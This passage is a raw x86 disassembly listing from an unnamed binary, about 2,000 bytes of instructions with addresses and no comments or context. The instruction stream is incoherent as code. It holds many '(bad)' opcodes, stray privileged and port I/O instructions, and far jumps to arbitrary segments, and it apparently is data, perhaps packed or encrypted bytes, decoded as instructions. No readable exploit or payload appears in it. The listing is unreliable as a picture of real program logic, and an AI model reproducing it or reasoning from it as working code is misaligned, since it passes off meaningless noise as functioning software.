  40822a:	adc    eax,0x51fe566b
  40822f:	inc    edx
  408230:	inc    esp
  408231:	shr    BYTE PTR [edi+0x480224a2],cl
  408237:	ins    BYTE PTR es:[edi],dx
  408238:	mov    esi,0xc078b4bc
  40823d:	mov    ebp,DWORD PTR [ebx+0x2b68fb30]
  408243:	or     edx,esi
  408245:	hlt    
  408246:	clc    
  408247:	repz mov cl,0x66
  40824a:	cmp    BYTE PTR [ebp+0x273c2d59],dl
  408250:	mov    edi,0x64c82d2c
  408255:	rol    BYTE PTR [edx-0x7f],1
  408258:	pop    edx
  408259:	fcmovu st,st(0)
  40825b:	or     al,0xa
  40825d:	cmc    
  40825e:	push   esi
  40825f:	loop   0x4081ed
  408261:	test   DWORD PTR [si],edi
  408264:	(bad)  
  408266:	ret    0x7cc5
  408269:	add    al,0x35
  40826b:	mov    edi,0x51fcea1
  408270:	loopne 0x40827d
  408272:	loope  0x408296
  408274:	test   al,0xc8
  408276:	or     eax,0x8137bd7f
  40827b:	pop    esi
  40827c:	lock add eax,0xd3c44fb2
  408282:	loopne 0x408238
  408284:	inc    esp
  408285:	sbb    edi,DWORD PTR [edi]
  408287:	push   ebx
  408288:	cmp    cl,BYTE PTR [esi+0x67]
  40828b:	(bad)  
  40828c:	iret   
  40828d:	inc    ebx
  40828e:	dec    edi
  40828f:	repnz mov al,ds:0xc40b5c5c
  408295:	sub    esi,DWORD PTR [esi]
  408297:	sahf   
  408298:	and    ecx,DWORD PTR [edi-0x60]
  40829b:	call   0xd1de585
  4082a0:	loope  0x4082c5
  4082a2:	lea    esi,[edx+0x30]
  4082a5:	out    0x5d,eax
  4082a7:	jg     0x4082fd
  4082a9:	inc    edx
  4082aa:	jno    0x4082d1
  4082ac:	ficom  DWORD PTR [ebp-0x3f]
  4082af:	sar    BYTE PTR [ebx-0x17d4b4f2],0xd5
  4082b6:	mov    es,WORD PTR [edi-0x1f]
  4082b9:	pop    es
  4082ba:	cli    
  4082bb:	and    al,0xb0
  4082bd:	mov    bl,0x82
  4082bf:	jl     0x40826d
  4082c1:	aaa    
  4082c2:	je     0x408295
  4082c4:	add    eax,0xcb90007
  4082c9:	adc    DWORD PTR [ebx+ebx*1+0x62],edi
  4082cd:	xor    edx,esp
  4082cf:	sbb    DWORD PTR [eax+0x2b],ebp
  4082d2:	lock dec edx
  4082d4:	cmp    bh,BYTE PTR [edx+eax*2+0x52]
  4082d8:	inc    ecx
  4082d9:	dec    eax
  4082da:	mov    ebp,0xa61099a7
  4082df:	cs xchg edi,eax
  4082e1:	inc    edi
  4082e2:	aas    
  4082e3:	sar    edi,cl
  4082e5:	shr    BYTE PTR [edx-0x44c7094d],cl
  4082eb:	mov    ch,0xa5
  4082ed:	push   esi
  4082ee:	xchg   BYTE PTR [ecx+0x31],bh
  4082f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082f2:	ret    
  4082f3:	in     eax,0xc6
  4082f5:	test   eax,0xa833a753
  4082fa:	(bad)  
  4082fb:	cli    
  4082fc:	fsub   st(4),st
  4082fe:	es adc al,0xf7
  408301:	jecxz  0x408334
  408303:	push   0xffffff8e
  408305:	mov    ah,0x10
  408307:	repz push ebx
  408309:	push   cs
  40830a:	adc    BYTE PTR ds:0x39e61738,dl
  408310:	sub    cl,al
  408312:	push   eax
  408313:	cs cmp edi,ebx
  408316:	aaa    
  408317:	inc    edi
  408318:	shl    DWORD PTR [ebx],0xb3
  40831b:	inc    edx
  40831c:	add    al,0x21
  40831e:	mov    ch,0x3
  408320:	out    0xf4,al
  408322:	xchg   edx,eax
  408323:	xchg   esi,eax
  408324:	ins    DWORD PTR es:[edi],dx
  408325:	mov    eax,ds:0x9bc94174
  40832a:	stos   BYTE PTR es:[edi],al
  40832b:	scas   eax,DWORD PTR es:[edi]
  40832c:	xlat   BYTE PTR ds:[ebx]
  40832d:	test   BYTE PTR [esi],cl
  40832f:	inc    ebx
  408330:	(bad)  
  408331:	aam    0x67
  408333:	xor    ah,BYTE PTR ds:0x4e64ed4d
  408339:	cmp    DWORD PTR [esi-0x20f080f2],ebx
  40833f:	call   0x77bb:0x21f04eca
  408346:	mov    eax,0x15520843
  40834b:	sbb    esp,DWORD PTR [esp+ebx*2]
  40834e:	push   ebp
  40834f:	pushf  
  408350:	add    edi,edx
  408352:	sub    al,0x72
  408354:	fldz   
  408356:	(bad)  
  408357:	mov    ecx,0x57c985c9
  40835c:	inc    esp
  40835d:	pushf  
  40835e:	imul   esi,esi,0x14
  408361:	and    DWORD PTR [ecx+0x6b9ffe24],ebx
  408367:	outs   dx,BYTE PTR ds:[esi]
  408368:	inc    edx
  408369:	fcomp  QWORD PTR [edi-0x1b]
  40836c:	data16 mov bl,0x8c
  40836f:	fdivr  st,st(0)
  408371:	mov    ebp,0x9912e3f0
  408376:	fwait
  408377:	shr    ch,0x23
  40837a:	sub    cl,dl
  40837c:	stos   DWORD PTR es:[edi],eax
  40837d:	dec    ebx
  40837e:	(bad)  
  40837f:	call   0x1816:0x492d8597
  408386:	inc    ebp
  408387:	sahf   
  408388:	popf   
  408389:	fld    QWORD PTR [edi]
  40838b:	jg     0x4083ae
  40838d:	adc    BYTE PTR [esi+0x61],0x5c
  408391:	imul   eax,edi,0x818fd680
  408397:	sti    
  408398:	xor    cl,0x31
  40839b:	test   al,0x62
  40839d:	cli    
  40839e:	hlt    
  40839f:	sbb    ebx,DWORD PTR [edx-0x74]
  4083a2:	inc    eax
  4083a3:	mov    esi,0x74e18129
  4083a8:	xor    ch,ch
  4083aa:	ss pop edx
  4083ac:	or     esp,DWORD PTR ds:0xe828be6b
  4083b2:	into   
  4083b3:	aad    0x76
  4083b5:	rol    DWORD PTR [ebp-0x67f9dc45],1
  4083bb:	xchg   esi,eax
  4083bc:	rol    BYTE PTR ds:0x8fd2f1c4,cl
  4083c2:	dec    edx
  4083c3:	lock test DWORD PTR [ebx],esi
  4083c6:	scas   al,BYTE PTR es:[edi]
  4083c7:	cdq    
  4083c8:	xlat   BYTE PTR ds:[ebx]
  4083c9:	adc    DWORD PTR [esi],0x3359ee4c
  4083cf:	mov    ecx,0xbda6f56a
  4083d4:	push   ecx
  4083d5:	push   ecx
  4083d6:	sbb    ecx,0xe22956da
  4083dc:	sub    eax,0x6582ed0
  4083e1:	lds    ebx,FWORD PTR [ebx+0x6fe91032]
  4083e7:	cld    
  4083e8:	cmp    DWORD PTR [edx],esp
  4083ea:	ins    WORD PTR es:[edi],dx
  4083ec:	sbb    ebx,DWORD PTR [edi-0x1f]
  4083ef:	(bad)  
  4083f0:	pop    ebx
  4083f1:	mov    ebx,0x3d33b04
  4083f6:	xchg   edi,eax
  4083f7:	adc    dl,ch
  4083f9:	dec    ebx
  4083fa:	std    
  4083fb:	sahf   
  4083fc:	sti    
  4083fd:	imul   eax,ebx,0x9bfc03f9
  408403:	mov    bl,0x16
  408405:	ret    
  408406:	inc    eax
  408407:	mov    BYTE PTR [edx+ebp*1-0x7d1c08f2],bl
  40840e:	cmp    al,al
  408410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408411:	pop    edi
  408412:	mov    eax,ds:0xe4a93659
  408417:	dec    esi
  408418:	outs   dx,DWORD PTR ds:[esi]
  408419:	fisttp DWORD PTR [ebx+0x69fc2a93]
  40841f:	out    dx,eax
  408420:	pusha  
  408421:	and    esp,DWORD PTR [eax+esi*2+0x5d]
  408425:	enter  0xbb00,0xa5
  408429:	sub    edx,eax
  40842b:	add    eax,DWORD PTR [ebx]
  40842d:	add    eax,DWORD PTR [ecx-0x20]
  408430:	stos   DWORD PTR es:[edi],eax
  408431:	pop    edx
  408432:	dec    ebp
  408433:	jmp    0xa90c:0x29d16f1b
  40843a:	sub    DWORD PTR [eax-0x30],ebp
  40843d:	test   ebp,ebp
  40843f:	icebp  
  408440:	xor    DWORD PTR ds:[esi],ecx
  408443:	cmp    al,0xb4
  408445:	cmp    DWORD PTR [edx+0x4d68d2ef],ebx
  40844b:	aad    0xa
  40844d:	je     0x40840f
  40844f:	inc    esp
  408450:	xor    cl,bh
  408452:	pop    ebp
  408453:	push   ds
  408454:	sub    eax,0xb3100646
  408459:	dec    esi
  40845a:	and    ch,BYTE PTR ds:0x3a05514c
  408460:	sbb    al,0xae
  408462:	pop    ds
  408463:	jp     0x40845f
  408465:	loope  0x40842a
  408467:	popa   
  408468:	pop    ebx
  408469:	dec    esi
  40846a:	retf   
  40846b:	mov    bl,0x3f
  40846d:	(bad)  
  40846e:	dec    ebx
  40846f:	bound  edi,QWORD PTR [ecx+0x4b]
  408472:	aam    0xc6
  408474:	adc    al,0xfb
  408476:	test   ah,ch
  408478:	and    DWORD PTR [edi],esi
  40847a:	aas    
  40847b:	xor    eax,0x2687d930
  408480:	adc    ecx,DWORD PTR [ebp-0x28dd6959]
  408486:	nop
  408487:	repnz push ss
  408489:	jbe    0x40843c
  40848b:	ins    BYTE PTR es:[edi],dx
  40848c:	mov    al,0xc4
  40848e:	xchg   ecx,eax
  40848f:	mov    WORD PTR [ecx+0x64],ss
  408492:	scas   al,BYTE PTR es:[edi]
  408493:	scas   al,BYTE PTR es:[edi]
  408494:	out    dx,al
  408495:	mov    ds:0x418d3847,al
  40849a:	je     0x40844c
  40849c:	outs   dx,DWORD PTR ds:[esi]
  40849d:	leave  
  40849e:	jmp    0x4084c1
  4084a0:	cs mov cl,0x4d
  4084a3:	das    
  4084a4:	push   ss
  4084a5:	adc    BYTE PTR [esp+ebx*4],ah
  4084a8:	mov    cl,0x28
  4084aa:	(bad)  
  4084ab:	xchg   DWORD PTR [eax],ebx
  4084ad:	stos   DWORD PTR es:[edi],eax
  4084ae:	sub    DWORD PTR [esp+ebp*2+0x44a36009],esp
  4084b5:	mov    al,BYTE PTR [ebp-0x10]
  4084b8:	out    dx,al
  4084b9:	popa   
  4084ba:	iret   
  4084bb:	pop    es
  4084bc:	xor    dh,al
  4084be:	or     eax,0x5302b56f
  4084c3:	test   al,0xa
  4084c5:	mov    ds:0x4ee5bb9f,al
  4084ca:	xor    al,0x99
  4084cc:	int    0xda
  4084ce:	mov    bl,BYTE PTR [eax]
  4084d0:	imul   eax,ebx,0x28db4587
  4084d6:	loop   0x4084c9
  4084d8:	rcr    BYTE PTR [edx+0x22],1
  4084db:	adc    eax,0xd66711fb
  4084e0:	xchg   BYTE PTR [esi-0x2d],al
  4084e3:	fcom   DWORD PTR [eax+0x2eaf2e2c]
  4084e9:	lods   al,BYTE PTR ds:[esi]
  4084ea:	out    dx,eax
  4084eb:	cmp    dh,bl
  4084ed:	fsub   DWORD PTR [eax-0x11]
  4084f0:	mov    bl,0x1
  4084f2:	lods   eax,DWORD PTR ds:[esi]
  4084f3:	xor    al,0x26
  4084f5:	cmp    esi,ebp
  4084f7:	mov    WORD PTR [esp+esi*8],fs
  4084fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084fb:	cmp    edx,DWORD PTR [edi+0x53]
  4084fe:	cdq    
  4084ff:	add    BYTE PTR [esi+0x3f2dffdf],bh
  408505:	imul   eax,DWORD PTR [edi-0x7d],0x3b
  408509:	xchg   esi,eax
  40850a:	adc    dl,0xff
  40850d:	sbb    eax,0x9c665351
  408512:	das    
  408513:	sbb    dl,dh
  408515:	(bad)  [edi+eax*1-0x50]
  408519:	arpl   WORD PTR [ebp+esi*2+0x4c1fd50f],bx
  408520:	rol    ecx,cl
  408522:	add    esp,DWORD PTR [ecx]
  408524:	and    DWORD PTR [ebp-0xacaeba8],0xffffffc2
  40852b:	mov    dh,0xd2
  40852d:	add    eax,0x5a70700c
  408532:	rol    DWORD PTR [edx-0x70],cl
  408535:	repnz push ecx
  408537:	test   al,0xdb
  408539:	jmp    0x408581
  40853b:	sub    BYTE PTR [ebx+0x5099cf23],ah
  408541:	mov    eax,ds:0x2b0f9b14
  408546:	push   0x4b
  408548:	rol    DWORD PTR [ebx],cl
  40854a:	aad    0xac
  40854c:	ja     0x408598
  40854e:	popa   
  40854f:	(bad)  
  408550:	mov    bl,0x7c
  408552:	dec    ebp
  408553:	jle    0x408599
  408555:	fcom   DWORD PTR [ebp+0x499b4d81]
  40855b:	stos   BYTE PTR es:[edi],al
  40855c:	xlat   BYTE PTR ds:[ebx]
  40855d:	mov    esp,0x57ffde48
  408562:	test   eax,0x17a7c341
  408567:	outs   dx,BYTE PTR ds:[esi]
  408568:	data16 neg bh
  40856b:	adc    ebx,DWORD PTR [ecx]
  40856d:	mov    dh,0xce
  40856f:	pop    eax
  408570:	retf   
  408571:	push   edi
  408572:	mov    ebp,0x1160feec
  408577:	or     dl,BYTE PTR [ecx-0xa]
  40857a:	sahf   
  40857b:	ret    
  40857c:	adc    dl,al
  40857e:	ins    BYTE PTR es:[edi],dx
  40857f:	lock ins DWORD PTR es:[edi],dx
  408581:	sbb    eax,0x72d2f6ed
  408586:	xor    al,BYTE PTR [ebx-0x59]
  408589:	add    ecx,DWORD PTR [edi+0x11]
  40858c:	adc    esi,DWORD PTR [edi+0x66c7eea8]
  408592:	dec    BYTE PTR [ebx+0x39]
  408595:	fistp  WORD PTR [edx+0xf]
  408598:	inc    ebx
  408599:	mov    ds:0x9d11a57b,eax
  40859e:	and    DWORD PTR [esi-0x11],eax
  4085a1:	jp     0x408597
  4085a3:	out    dx,al
  4085a4:	and    al,0x4c
  4085a6:	sbb    ch,ah
  4085a8:	xor    BYTE PTR [ebx],ah
  4085aa:	adc    al,0x2d
  4085ac:	jo     0x408587
  4085ae:	aam    0x8a
  4085b0:	jbe    0x4085f0
  4085b2:	dec    eax
  4085b3:	mov    ds:0xe9baf194,al
  4085b8:	stos   BYTE PTR es:[edi],al
  4085b9:	enter  0x118f,0x12
  4085bd:	out    dx,eax
  4085be:	dec    ebx
  4085bf:	xchg   esp,eax
  4085c0:	mov    ds:0xc15e3e90,al
  4085c5:	ret    
  4085c6:	pop    eax
  4085c7:	cdq    
  4085c8:	cmp    al,0x3d
  4085ca:	jg     0x4085e1
  4085cc:	outs   dx,DWORD PTR ds:[esi]
  4085cd:	or     dh,BYTE PTR [eax]
  4085cf:	jmp    0xd9c1:0x5b3a4b5e
  4085d6:	xchg   ebx,eax
  4085d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085d8:	cli    
  4085d9:	das    
  4085da:	adc    dh,0x48
  4085dd:	gs inc edi
  4085df:	int    0xb1
  4085e1:	dec    edx
  4085e2:	adc    DWORD PTR [ebx+0x214ced6e],0x61500232
  4085ec:	gs pop esi
  4085ee:	gs (bad) 
  4085f0:	pop    eax
  4085f1:	mov    cl,0x71
  4085f3:	retf   0x89e4
  4085f6:	dec    DWORD PTR [edx+0x532ed331]
  4085fc:	mov    dh,0x7b
  4085fe:	xchg   ebp,eax
  4085ff:	imul   esp,DWORD PTR [edx+0x5d],0x8621472e
  408606:	mov    esi,edx
  408608:	xor    edi,DWORD PTR [esi+edx*4+0x44]
  40860c:	imul   esi,DWORD PTR [eax-0x2f],0x619ee7b8
  408613:	sbb    BYTE PTR [eax-0x47025725],cl
  408619:	addr16 jp 0x4085c4
  40861c:	ds (bad) 
  40861e:	dec    edx
  40861f:	push   eax
  408620:	mov    eax,ds:0x2e1fc98e
  408625:	shl    BYTE PTR [ebp+0x678b157c],0xf6
  40862c:	xchg   esi,eax
  40862d:	dec    ebp
  40862e:	push   esp
  40862f:	push   ds
  408630:	jecxz  0x408633
  408632:	fs xchg ebx,eax
  408634:	mov    ss,ebp
  408636:	dec    edx
  408637:	aam    0x42
  408639:	push   edi
  40863a:	call   0xb6cb:0x590d953b
  408641:	adc    al,BYTE PTR [edi-0x2307d100]
  408647:	ret    0xbe74
  40864a:	mov    esi,0x51e4cfe0
  40864f:	mov    ebx,edx
  408651:	push   0x412e1524
  408656:	in     al,dx
  408657:	sbb    eax,0xa8eaa9d
  40865c:	or     eax,0x44a67d8
  408661:	gs mov dl,0x11
  408664:	inc    ecx
  408665:	loop   0x4086e4
  408667:	iret   
  408668:	and    DWORD PTR [ecx-0x52],esp
  40866b:	pop    edi
  40866c:	inc    esi
  40866d:	fisub  WORD PTR [ebp+ecx*4-0x7e6ce1a9]
  408674:	mov    edx,0xf7977e3a
  408679:	daa    
  40867a:	test   eax,0xda4384bd
  40867f:	popa   
  408680:	enter  0xca00,0xe3
  408684:	pop    ss
  408685:	cmc    
  408686:	pop    ebp
  408687:	and    BYTE PTR [esi],al
  408689:	xchg   ebx,eax
  40868a:	add    BYTE PTR [ebx+0x14dbed5f],dh
  408690:	and    ebx,DWORD PTR [ebp+eiz*4-0x543bd455]
  408697:	cmp    bl,BYTE PTR [edi-0x5a6f2daf]
  40869d:	and    ebx,esp
  40869f:	lods   eax,DWORD PTR ds:[esi]
  4086a0:	in     eax,dx
  4086a1:	arpl   WORD PTR [ebx],di
  4086a3:	sub    ebx,DWORD PTR [esi+0x7acc2eb1]
  4086a9:	jmp    FWORD PTR [eax+ebp*2+0x41]
  4086ad:	nop
  4086ae:	mov    edx,esi
  4086b0:	les    ebp,FWORD PTR [eax]
  4086b2:	aam    0x27
  4086b4:	sub    al,0x44
  4086b6:	inc    ecx
  4086b7:	scas   eax,DWORD PTR es:[edi]
  4086b8:	in     al,0x40
  4086ba:	pop    eax
  4086bb:	xchg   BYTE PTR [esi-0x57],bl
  4086be:	jecxz  0x4086eb
  4086c0:	popf   
  4086c1:	js     0x4086f9
  4086c3:	out    dx,eax
  4086c4:	or     DWORD PTR [ebx],esp
  4086c6:	and    eax,0x48a4043d
  4086cb:	sub    eax,0xcffc43c5
  4086d0:	push   cs
  4086d1:	xlat   BYTE PTR ds:[ebx]
  4086d2:	mov    DWORD PTR [esi],ebx
  4086d4:	jnp    0x40871e
  4086d6:	(bad)  
  4086d8:	out    0x18,eax
  4086da:	mov    ah,0xcf
  4086dc:	or     edx,DWORD PTR [esp+edx*8+0x6b7a827a]
  4086e3:	repnz (bad) 
  4086e5:	jg     0x4086de
  4086e7:	lock sub al,BYTE PTR [ebp-0x6d]
  4086eb:	jp     0x40867a
  4086ed:	xchg   BYTE PTR [ebp-0x681081c3],dh
  4086f3:	push   eax
  4086f4:	sub    DWORD PTR [ecx+0x7c21bda4],eax
  4086fa:	add    al,0x19
  4086fc:	into   
  4086fd:	mov    eax,ds:0xdd8e2248
  408702:	loope  0x40875a
  408704:	adc    al,0xa
  408706:	xchg   BYTE PTR cs:[edx-0x29],dh
  40870a:	stc    
  40870b:	mov    ?,WORD PTR [ebp-0x27]
  40870e:	mov    esi,0xea201d7e
  408713:	ret    0x7988
  408716:	xor    eax,DWORD PTR [edx]
  408718:	jp     0x4086a7
  40871a:	add    BYTE PTR [edx+0x13],dh
  40871d:	push   edi
  40871e:	sbb    al,0x83
  408720:	adc    DWORD PTR [ebx+0x4d],esi
  408723:	out    dx,al
  408724:	loope  0x4086f1
  408726:	leave  
  408727:	pop    edi
  408728:	pusha  
  408729:	dec    esp
  40872a:	add    BYTE PTR [eax],0x36
  40872d:	cmp    ch,ch
  40872f:	lds    edi,FWORD PTR ds:0x6cce66a6
  408735:	jnp    0x40878c
  408737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408738:	arpl   sp,sp
  40873a:	dec    edi
  40873b:	les    ebx,FWORD PTR [ecx-0x5b4be6b]
  408741:	mov    ebx,0x3a864b29
  408746:	sbb    esi,edi
  408748:	cli    
  408749:	addr16 mov dh,0xa4
  40874c:	lods   eax,DWORD PTR ds:[esi]
  40874d:	into   
  40874e:	(bad)  
  40874f:	lock fnsave [ecx-0x2400b295]
  408756:	dec    esp
  408757:	ret    
  408758:	mov    ds,WORD PTR [esi-0x27be6ce9]
  40875e:	lock jno 0x4087ac
  408761:	cmp    al,BYTE PTR ds:0x8b3e60a0
  408767:	pop    ecx
  408768:	add    ebx,ebx
  40876a:	xor    eax,0x2ad8ac9b
  40876f:	mov    ch,ah
  408771:	or     eax,0xed58aed2
  408776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408777:	sbb    al,0x87
  408779:	jae    0x4087ba
  40877b:	push   ebp
  40877c:	jmp    0x40878c
  40877e:	data16 jae 0x4087c1
  408781:	xor    bh,dl
  408783:	popa   
  408784:	or     DWORD PTR ds:0x17d1c97b,edi
  40878a:	(bad)  
  40878b:	arpl   WORD PTR [edi],di
  40878d:	cmp    eax,0xb3d65556
  408792:	or     esp,esp
  408794:	fistp  QWORD PTR [esp+ebp*1+0x4a]
  408798:	mov    BYTE PTR [edx-0x313ff52e],bh
  40879e:	and    esp,ebx
  4087a0:	(bad)  
  4087a1:	mov    WORD PTR [eax+0x23736ba8],?
  4087a7:	(bad)  
  4087a9:	xor    esp,ecx
  4087ab:	cs loope 0x4087b3
  4087ae:	pop    edi
  4087af:	in     eax,dx
  4087b0:	cmp    BYTE PTR [edi],0xde
  4087b3:	out    0x23,al
  4087b5:	data16 outs dx,BYTE PTR ds:[esi]
  4087b7:	and    DWORD PTR [edx],edx
  4087b9:	int3   
  4087ba:	popa   
  4087bb:	and    DWORD PTR [edi+esi*1+0x74],edx
  4087bf:	push   es
  4087c0:	add    al,0x1e
  4087c2:	pop    edi
  4087c3:	pop    ds
  4087c4:	call   0x1a5d:0xd883005d
  4087cb:	lds    edi,FWORD PTR [ebx+eiz*1+0x4ec870f6]
  4087d2:	xor    cl,bl
  4087d4:	aas    
  4087d5:	and    eax,0x528874a8
  4087da:	fst    DWORD PTR [esi-0x6c34b118]
  4087e0:	fs jmp 0x4087c4
  4087e3:	js     0x408811
  4087e5:	mov    eax,ds:0x1d0a0f7c
  4087ea:	neg    ch
  4087ec:	sbb    ebx,DWORD PTR [esi]
  4087ee:	mov    esp,0x2e4f9913
  4087f3:	mov    ds:0xa17b2593,eax
  4087f8:	in     al,0xf3
  4087fa:	test   DWORD PTR [edx-0x51904dab],ecx
  408800:	dec    BYTE PTR [ecx+0x1f]
  408803:	scas   eax,DWORD PTR es:[edi]
  408804:	test   al,0xd2
  408806:	or     esp,DWORD PTR ds:0xb202fffa
  40880c:	push   esp
  40880d:	adc    bl,BYTE PTR [edx]
  40880f:	mov    edi,0xaeee0011
  408814:	rcr    BYTE PTR [ecx*8+0x34ca1cbf],1
  40881b:	lods   eax,DWORD PTR ds:[esi]
  40881c:	and    edx,DWORD PTR [ecx-0x2349dbdb]
  408822:	out    0x1e,al
  408824:	sar    DWORD PTR [eax+0x4732b59a],cl
  40882a:	icebp  
  40882b:	dec    eax
  40882c:	sar    BYTE PTR [ecx],1
  40882e:	aam    0x5d
  408830:	sbb    eax,0x49ccc4ea
  408835:	xor    ebx,DWORD PTR [edi]
  408837:	std    
  408838:	jle    0x4088a9
  40883a:	xchg   BYTE PTR [edi],dh
  40883c:	cmp    eax,0x8c018d11
  408841:	jge    0x40888b
  408843:	repz in al,0x2f
  408846:	xor    bl,cl
  408848:	sbb    al,0x6f
  40884a:	test   al,ah
  40884c:	or     eax,0x1b759a07
  408851:	pop    es
  408852:	loop   0x408807
  408854:	push   edx
  408855:	push   ebp
  408856:	xchg   ecx,eax
  408857:	in     al,0x19
  408859:	in     al,dx
  40885a:	fs jae 0x4088a8
  40885d:	push   ebx
  40885e:	mov    ch,0x40
  408860:	shl    edx,1
  408862:	out    0xe1,eax
  408864:	js     0x4088d0
  408866:	pmullw mm2,mm3
  408869:	ror    DWORD PTR [edi+ecx*2],1
  40886c:	aam    0xcb
  40886e:	stc    
  40886f:	xchg   BYTE PTR [eax-0x6d],ch
  408872:	sbb    bl,BYTE PTR [ecx]
  408874:	pushf  
  408875:	mov    dh,0xb8
  408877:	xor    cl,BYTE PTR [edx+0x4a9e5542]
  40887d:	outs   dx,BYTE PTR ds:[esi]
  40887e:	push   ss
  40887f:	or     al,ch
  408881:	fbld   TBYTE PTR [ecx-0x4ae07c32]
  408887:	outs   dx,DWORD PTR ds:[esi]
  408888:	mov    BYTE PTR [eax+0x6c],al
  40888b:	mov    DWORD PTR [ebp-0x65a3fe10],edi
  408891:	mov    al,ds:0x8cc346c7
  408896:	cmp    dh,BYTE PTR [ebx]
  408898:	retf   
  408899:	push   edx
  40889a:	mov    al,0x84
  40889c:	push   edx
  40889d:	hlt    
  40889e:	int    0x7
  4088a0:	int3   
  4088a1:	dec    esi
  4088a2:	add    BYTE PTR [edx-0x1],dl
  4088a5:	push   0x8
  4088a7:	mov    edi,0x2c2b3172
  4088ac:	push   cs
  4088ad:	(bad)  
  4088ae:	(bad)  
  4088af:	xlat   BYTE PTR ds:[ebx]
  4088b0:	cmp    cl,ch
  4088b2:	mov    esi,0x14851d4c
  4088b7:	hlt    
  4088b8:	int    0xe3
  4088ba:	nop
  4088bb:	mov    WORD PTR [ebx+0x14041b69],ds
  4088c1:	adc    al,BYTE PTR [edx]
  4088c3:	sub    eax,DWORD PTR [eax-0x40]
  4088c6:	mov    esp,0x5e497545
  4088cb:	dec    edx
  4088cc:	out    dx,al
  4088cd:	call   0x50aca859
  4088d2:	mov    dh,0x2b
  4088d4:	stc    
  4088d5:	fnstenv [edx-0x7666b60b]
  4088db:	imul   esi,DWORD PTR [edx+0x9688512],0x2a116bd3
  4088e5:	cmc    
  4088e6:	out    0xa8,al
  4088e8:	cmp    ebx,ecx
  4088ea:	sbb    eax,0x46e25b5c
  4088ef:	dec    esp
  4088f0:	push   edx
  4088f1:	fucomi st,st(2)
  4088f3:	fdiv   st(5),st
  4088f5:	pop    es
  4088f6:	or     edx,ebp
  4088f8:	mov    esp,0x2fdbea7e
  4088fd:	add    DWORD PTR [edi-0x75],ecx
  408900:	mov    ebx,0x23dde70
  408905:	or     BYTE PTR [esi],0xa0
  408908:	hlt    
  408909:	int    0x14
  40890b:	push   ebx
  40890c:	pop    ecx
  40890d:	inc    eax
  40890e:	ficom  WORD PTR [ebx+0x2c5d6086]
  408914:	mov    edx,0x9997ff3d
  408919:	push   cs
  40891a:	cmc    
  40891b:	xor    bl,dl
  40891d:	int3   
  40891e:	out    0xd8,eax
  408920:	fmul   DWORD PTR [ebp-0x608ea918]
  408926:	imul   eax,DWORD PTR [edi-0x23],0x31
  40892a:	sub    eax,0x3a7d25e7
  40892f:	cld    
  408930:	jbe    0x408961
  408932:	out    0x17,eax
  408934:	sbb    bh,bh
  408936:	daa    
  408937:	xor    al,0x62
  408939:	popa   
  40893a:	adc    DWORD PTR [ecx+ebx*4],ebx
  40893d:	pop    esp
  40893e:	xor    bh,BYTE PTR [esi+0x7c4862be]
  408944:	xchg   edi,eax
  408945:	sub    eax,0x90aa79a7
  40894a:	mov    edi,0x475d5d60
  40894f:	adc    al,bh
  408951:	xchg   ecx,eax
  408952:	fcmovbe st,st(1)
  408954:	mov    cs,WORD PTR [eax]
  408956:	pop    esi
  408957:	scas   al,BYTE PTR es:[edi]
  408958:	iret   
  408959:	pop    es
  40895a:	mov    dh,0xa0
  40895c:	sahf   
  40895d:	push   ss
  40895e:	enter  0x6c1d,0x22
  408962:	mov    cl,BYTE PTR [edi+edx*1+0x24]
  408966:	bound  eax,QWORD PTR [ecx-0x4a]
  408969:	xchg   ebx,eax
  40896a:	push   cs
  40896b:	(bad)  
  40896c:	or     ecx,edx
  40896e:	or     bh,BYTE PTR [ebp+0x70]
  408971:	jae    0x408957
  408973:	mov    bh,0x2f
  408975:	jmp    0x4089d7
  408977:	lods   eax,DWORD PTR ds:[esi]
  408978:	or     ch,dl
  40897a:	cmc    
  40897b:	lds    eax,FWORD PTR [eax]
  40897d:	mov    ch,0x37
  40897f:	sbb    cl,ah
  408981:	push   edx
  408982:	sub    eax,0xa8788b4b
  408987:	div    DWORD PTR [edi]
  408989:	and    BYTE PTR [eax+0xb],dh
  40898c:	mov    ebp,DWORD PTR [edx]
  40898e:	not    esi
  408990:	and    al,0xdc
  408992:	push   0x3
  408994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408995:	dec    edx
  408996:	sahf   
  408997:	dec    ebp
  408998:	fstp   DWORD PTR [eax]
  40899a:	jno    0x408945
  40899c:	push   ss
  40899d:	rol    BYTE PTR [ebx-0x3a0d02b2],cl
  4089a3:	adc    edx,DWORD PTR [eax]
  4089a5:	mov    fs,WORD PTR [edi-0xb1f0c43]
  4089ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089ac:	xchg   dl,dh
  4089ae:	adc    cl,BYTE PTR [ebx-0x4c]
  4089b1:	pop    esi
  4089b2:	mov    cl,0x97
  4089b4:	mov    al,ds:0x96f4b53
  4089b9:	ret    
  4089ba:	cmp    DWORD PTR [ecx],esi
  4089bc:	fsubr  QWORD PTR [eax+0x7653eea]
  4089c2:	pop    ds
  4089c3:	jno    0x408a3b
  4089c5:	adc    BYTE PTR [esp+edi*1-0x51d4611f],al
  4089cc:	mov    BYTE PTR [eax],ch
  4089ce:	push   eax
  4089cf:	xor    DWORD PTR [eax+ebx*2+0x4f],ebp
  4089d3:	xchg   ebx,eax
  4089d4:	inc    eax
  4089d5:	test   DWORD PTR [edi+0x23c0d9bd],esi
  4089db:	pop    eax
  4089dc:	jnp    0x408982
  4089de:	pop    ds
  4089df:	jmp    0x130b5bf4
  4089e4:	icebp  
  4089e5:	lea    ebp,[esi]
  4089e7:	inc    edx
  4089e8:	inc    ebx
  4089e9:	mov    cl,0xfd
  4089eb:	cmp    eax,0xcd4def62
  4089f0:	or     BYTE PTR ds:0x489402b0,ch
  4089f6:	mov    cl,0xc
  4089f8:	outs   dx,DWORD PTR ds:[esi]
  4089f9:	mov    ah,0x3a
  4089fb:	int3   
  4089fc:	mov    edx,0x288b585c
  408a01:	push   eax
  408a02:	ficomp DWORD PTR [eax]
  408a04:	imul   esp,edx,0x6400ccab
  408a0a:	xchg   ebx,eax
  408a0b:	jo     0x408a6e
  408a0d:	and    DWORD PTR [ebp+esi*2-0x44],ecx
